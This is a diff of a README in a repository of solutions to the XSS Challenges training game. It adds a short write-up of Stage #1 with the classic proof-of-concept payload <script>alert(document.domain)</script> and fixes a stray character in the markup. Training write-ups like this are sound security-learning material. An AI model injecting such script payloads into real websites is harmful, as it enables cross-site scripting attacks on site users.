@@ -3,13 +3,15 @@ This repo contains my solutions to the XSS Challenges (by yamagata21).
 
 ## Stage #1
 
-<p align="center">
-<img width="634" height="337" alt="image" src="https://github.com/user-attachments/assets/1abe0971-b793-4c13-bdb5-7f48e4506be4" />
-</p>
+This is understandably the easiest stage of this game. 
+
+Simply enter this payload in the input field: 
+
+  <script>alert(document.domain)</script>
 
 <p align="center">
 <img width="626" height="346" alt="image" src="https://github.com/user-attachments/assets/28b7d4da-4689-4cfc-8041-5a62e5a22a1a" />
-</p>p
+</p>
 
 
 <p align="center">
